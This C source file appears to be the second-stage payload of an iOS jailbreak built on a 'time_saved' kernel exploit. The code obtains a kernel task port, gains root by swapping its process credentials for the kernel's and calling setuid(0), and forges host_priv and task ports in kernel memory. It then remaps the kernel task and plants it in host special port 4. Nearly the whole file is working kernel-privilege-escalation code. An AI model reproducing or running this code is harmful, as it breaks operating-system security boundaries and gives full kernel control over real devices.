#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <mach/mach.h>
#include "common.h"
#include "time_saved/time_saved.h"
#include <asl.h>
#include <CoreFoundation/CoreFoundation.h>

extern mach_port_t tfpzero;
extern uint64_t kernel_slide;

extern uint64_t self_struct_proc;
extern uint64_t kern_struct_proc;

uint64_t IPCSpaceKernel() {
    return rk64(find_port(mach_task_self()) + 0x60);
}

const uint64_t kernel_address_space_base = 0xffff000000000000;
void Kernel_memcpy(uint64_t dest, uint64_t src, uint32_t length) {
    if (dest >= kernel_address_space_base) {
        // copy to kernel:
        kwrite(dest, (void*) src, length);
    } else {
        // copy from kernel
        kread(src, (void*)dest, length);
    }
}

bool PatchHostPriv(mach_port_t host) {
    
#define IO_ACTIVE 0x80000000
#define IKOT_HOST_PRIV 4
    
    // locate port in kernel
    uint64_t host_kaddr = find_port(host);
    
    // change port host type
    uint32_t old = rk32(host_kaddr + 0x0);
    // printf("[-] Old host type: 0x%x\n", old);
    
    wk32(host_kaddr + 0x0, IO_ACTIVE | IKOT_HOST_PRIV);
    
    uint32_t new = rk32(host_kaddr);
    // printf("[-] New host type: 0x%x\n", new);
    
    return ((IO_ACTIVE | IKOT_HOST_PRIV) == new) ? true : false;
}

mach_port_t FakeHostPriv_port = MACH_PORT_NULL;
// build a fake host priv port
mach_port_t FakeHostPriv() {
    if (FakeHostPriv_port != MACH_PORT_NULL) {
        return FakeHostPriv_port;
    }
    // get the address of realhost:
    uint64_t hostport_addr = find_port(mach_host_self());
    uint64_t realhost = rk64(hostport_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    
    // allocate a port
    mach_port_t port = MACH_PORT_NULL;
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (err != KERN_SUCCESS) {
        // printf("[-] failed to allocate port\n");
        return MACH_PORT_NULL;
    }
    // get a send right
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    
    // make sure port type has IKOT_HOST_PRIV
    PatchHostPriv(port);
    
    // locate the port
    uint64_t port_addr = find_port(port);

    // change the space of the port
    wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), IPCSpaceKernel());
    
    // set the kobject
    wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), realhost);
    
    FakeHostPriv_port = port;
    
    return port;
}

void convertPortToTaskPort(mach_port_t port, uint64_t space, uint64_t task_kaddr) {
    // now make the changes to the port object to make it a task port:
    uint64_t port_kaddr = find_port(port);
    
    wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), 0x80000000 | 2);
    wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES), 0xf00d);
    wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS), 0xf00d);
    wk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), space);
    wk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT),  task_kaddr);
    
    // swap our receive right for a send right:
    uint64_t task_port_addr = find_port(mach_task_self());
    uint64_t task_addr = rk64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    uint64_t itk_space = rk64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    uint32_t bits = rk32(is_table + (port_index * sizeof_ipc_entry_t) + 8); // 8 = offset of ie_bits in struct ipc_entry
    
#define IE_BITS_SEND (1<<16)
#define IE_BITS_RECEIVE (1<<17)
    
    bits &= (~IE_BITS_RECEIVE);
    bits |= IE_BITS_SEND;
    
    wk32(is_table + (port_index * sizeof_ipc_entry_t) + 8, bits);
}

void MakePortFakeTaskPort(mach_port_t port, uint64_t task_kaddr) {
    convertPortToTaskPort(port, IPCSpaceKernel(), task_kaddr);
}

uint64_t Kernel_alloc_wired(uint64_t size) {
    if (tfpzero == MACH_PORT_NULL) {\
        return 0;
    }
    
    kern_return_t err;
    mach_vm_address_t addr = 0;
    mach_vm_size_t ksize = round_page_kernel(size);
    
    // printf("[*] vm_kernel_page_size: %lx\n", vm_kernel_page_size);
    
    err = mach_vm_allocate(tfpzero, &addr, ksize+0x4000, VM_FLAGS_ANYWHERE);
    if (err != KERN_SUCCESS) {\
        return 0;
    }
    
    // printf("[+] allocated address: %llx\n", addr);
    
    addr += 0x3fff;
    addr &= ~0x3fffull;
    
    // printf("[*] address to wire: %llx\n", addr);
    
    err = mach_vm_wire(FakeHostPriv(), tfpzero, addr, ksize, VM_PROT_READ|VM_PROT_WRITE);
    if (err != KERN_SUCCESS) {\
        return 0;
    }
    return addr;
}


uint64_t make_fake_task(uint64_t vm_map) {
    uint64_t fake_task_kaddr = Kernel_alloc_wired(0x1000);

    void* fake_task = malloc(0x1000);
    memset(fake_task, 0, 0x1000);
    *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT)) = 0xd00d; // leak references
    *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_ACTIVE)) = 1;
    *(uint64_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = vm_map;
    *(uint8_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;
    Kernel_memcpy(fake_task_kaddr, (uint64_t) fake_task, 0x1000);
    free(fake_task);

    return fake_task_kaddr;
}

// bool rootify(void) {
//     uint64_t proc = self_struct_proc;
//     uint64_t ucred = rk64(proc + 0xf8);
//     //make everything 0 without setuid(0), pretty straightforward.
//     wk32(proc + 0x28, 0);
//     wk32(proc + 0x30, 0);
//     wk32(proc + 0x2c, 0);
//     wk32(proc + 0x34, 0);
//     wk32(ucred + 0x18, 0);
//     wk32(ucred + 0x1c, 0);
//     wk32(ucred + 0x20, 0);
//     wk32(ucred + 0x24, 1);
//     wk32(ucred + 0x28, 0);
//     wk32(ucred + 0x68, 0);
//     wk32(ucred + 0x6c, 0);
    
//     return (rk32(proc + 0x2c) == 0) ? true : false;
// }

int setHSP4() {
    // huge thanks to Siguza for hsp4 & v0rtex
    // for explainations and being a good rubber duck :p

    // see https://github.com/siguza/hsp4 for some background and explaination
    // tl;dr: there's a pointer comparison in convert_port_to_task_with_exec_token
    //   which makes it return TASK_NULL when kernel_task is passed
    //   "simple" vm_remap is enough to overcome this.

    // However, vm_remap has weird issues with submaps -- it either doesn't remap
    // or using remapped addresses leads to panics and kittens crying.

    // tasks fall into zalloc, so src_map is going to be zone_map
    // zone_map works perfectly fine as out zone -- you can
    // do remap with src/dst being same and get new address

    // however, using kernel_map makes more sense
    // we don't want zalloc to mess with our fake task
    // and neither

    // proper way to use vm_* APIs from userland is via mach_vm_*
    // but those accept task ports, so we're gonna set up
    // fake task, which has zone_map as its vm_map
    // then we'll build fake task port from that
    // and finally pass that port both as src and dst

    // last step -- wire new kernel task -- always a good idea to wire critical
    // kernel structures like tasks (or vtables :P )

    // and we can write our port to realhost.special[4]

    // we can use mach_host_self() if we're root
    
    mach_port_t mapped_tfp0 = MACH_PORT_NULL;
    mach_port_t *port = &mapped_tfp0;
    mach_port_t host_priv = FakeHostPriv();

    int ret;
    uint64_t remapped_task_addr = 0;
    // task is smaller than this but it works so meh
    uint64_t sizeof_task = 0x1000;

    uint64_t kernel_task_kaddr = kern_struct_task;

    mach_port_t zm_fake_task_port = MACH_PORT_NULL;
    mach_port_t km_fake_task_port = MACH_PORT_NULL;
    ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &zm_fake_task_port);
    ret = ret || mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &km_fake_task_port);

    if (ret == KERN_SUCCESS && *port == MACH_PORT_NULL) {
        ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, port);
    }

    if (ret != KERN_SUCCESS) {
        // printf("[remap_kernel_task] unable to allocate ports: 0x%x (%s)\n", ret, mach_error_string(ret));
        return 1;
    }

    // strref \"Nothing being freed to the zone_map. start = end = %p\\n\"
    // or traditional \"zone_init: kmem_suballoc failed\"
    uint64_t zone_map_kptr = (kernel_slide + koffset(KOFFSET_ZONE_MAP_REF));//XXX Find_zone_map_ref();
    uint64_t zone_map = rk64(zone_map_kptr);

    // asl_log(NULL, NULL, ASL_LEVEL_ERR, "[stage2] 1");
    // sleep(2);

    // kernel_task->vm_map == kernel_map
    uint64_t kernel_map = rk64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
    asl_log(NULL, NULL, ASL_LEVEL_ERR, "[stage2] 3.5 koffset(KOFFSET_ZONE_MAP_REF): 0x%llx, zone_map_kptr: 0x%llx, zone_map: 0x%llx, kernel_map: 0x%llx", koffset(KOFFSET_ZONE_MAP_REF), zone_map_kptr, zone_map, kernel_map);

    // asl_log(NULL, NULL, ASL_LEVEL_ERR, "[stage2] 2");
    // sleep(2);

    uint64_t zm_fake_task_kptr = make_fake_task(zone_map);
    uint64_t km_fake_task_kptr = make_fake_task(kernel_map);

    // asl_log(NULL, NULL, ASL_LEVEL_ERR, "[stage2] 3");
    // sleep(2);

    MakePortFakeTaskPort(zm_fake_task_port, zm_fake_task_kptr);
    MakePortFakeTaskPort(km_fake_task_port, km_fake_task_kptr);

    km_fake_task_port = zm_fake_task_port;

    vm_prot_t cur, max;
    ret = mach_vm_remap(km_fake_task_port,
                        &remapped_task_addr,
                        sizeof_task,
                        0,
                        VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR,
                        zm_fake_task_port,
                        kernel_task_kaddr,
                        0,
                        &cur, &max,
                        VM_INHERIT_NONE);


    if (ret != KERN_SUCCESS) {
        // printf("[remap_kernel_task] remap failed: 0x%x (%s)\n", ret, mach_error_string(ret));
        return 1;
    }

    if (kernel_task_kaddr == remapped_task_addr) {
        // printf("[remap_kernel_task] remap failure: addr is the same after remap\n");
        return 1;
    }

    // printf("[remap_kernel_task] remapped successfully to 0x%llx\n", remapped_task_addr);

    ret = mach_vm_wire(host_priv, km_fake_task_port, remapped_task_addr, sizeof_task, VM_PROT_READ | VM_PROT_WRITE);

    if (ret != KERN_SUCCESS) {
        // printf("[remap_kernel_task] wire failed: 0x%x (%s)\n", ret, mach_error_string(ret));
        return 1;
    }

    uint64_t port_kaddr = find_port(*port);
    // printf("[remap_kernel_task] port kaddr: 0x%llx\n", port_kaddr);

    MakePortFakeTaskPort(*port, remapped_task_addr);

    if (rk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) != remapped_task_addr) {
        // printf("[remap_kernel_task] read back tfpzero kobject didnt match!\n");
        return 1;
    }

    // lck_mtx -- arm: 8  arm64: 16
    const int off_host_special = 0x10;
    uint64_t host_priv_kaddr = find_port(mach_host_self());
    uint64_t realhost_kaddr = rk64(host_priv_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    wk64(realhost_kaddr + off_host_special + 4 * sizeof(void*), port_kaddr);

    return 0;
  }

int main() {
  asl_log(NULL, NULL, ASL_LEVEL_ERR, "[stage2] loaded");

  // goto TEST;

  int tfpzero = start_time_saved();
  asl_log(NULL, NULL, ASL_LEVEL_ERR, "[stage2] tfp0 = 0x%x, kslide: 0x%llx, kern_struct_task: 0x%llx", tfpzero, kernel_slide, kern_struct_task);
  sleep(2);
  // rootify();
  uint64_t kern_ucred = rk64(kern_struct_proc + 0xf8);
  uint64_t self_ucred = rk64(self_struct_proc + 0xf8);
  wk64(self_struct_proc + 0xf8, kern_ucred);

  setuid(0);
  setuid(0);
  asl_log(NULL, NULL, ASL_LEVEL_ERR, "[stage2] uid: %d", getuid());
  sleep(2);

  setHSP4();
  asl_log(NULL, NULL, ASL_LEVEL_ERR, "[stage2] setHSP4!!!");
  sleep(2);

TEST:
  mach_port_t hsp4 = MACH_PORT_NULL;
  host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, 4, &hsp4);
  asl_log(NULL, NULL, ASL_LEVEL_ERR, "[stage2] hsp4 = 0x%x", hsp4);
  mach_port_destroy(mach_host_self(), hsp4);
  // SetHSP4(tfpzero);

  wk64(self_struct_proc + 0xf8, self_ucred);

  return 0;
}

uint64_t entry[] = { MAGIC, (uint64_t)&main };
